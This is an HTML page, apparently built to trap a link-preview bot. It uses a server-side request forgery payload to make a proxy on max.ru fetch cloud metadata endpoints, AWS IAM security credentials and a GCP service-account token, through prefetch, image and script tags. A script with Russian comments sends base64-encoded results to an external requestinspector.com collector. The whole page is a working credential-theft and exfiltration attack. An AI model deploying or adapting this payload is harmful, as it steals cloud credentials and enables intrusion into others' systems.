<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Internal Data Check</title>
    
    <meta property="og:description" content="Check result">
    
    <link rel="prefetch" href="https://max.ru/proxy?url=http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/default">

    <img src="https://max.ru/proxy?url=http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token?header=Metadata-Flavor:Google">

</head>
<body>
    <script>
        // Если бот всё же умеет в JS, этот код отправит нам точное время
        const inspector = "https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com";
        const sensitiveTarget = "http://169.254.169.254.nip.io/latest/meta-data/";
        
        fetch(`https://max.ru/proxy?url=${encodeURIComponent(sensitiveTarget)}`)
            .then(r => r.text())
            .then(data => {
                // Если мы получили данные, шлем их тебе в инспектор (BASE64)
                fetch(`${inspector}/EXFILTRATED_DATA?d=${btoa(data.substring(0, 100))}`);
            }).catch(e => {
                fetch(`${inspector}/ERROR?e=blocked`);
            });
    </script>
</body>
</html>
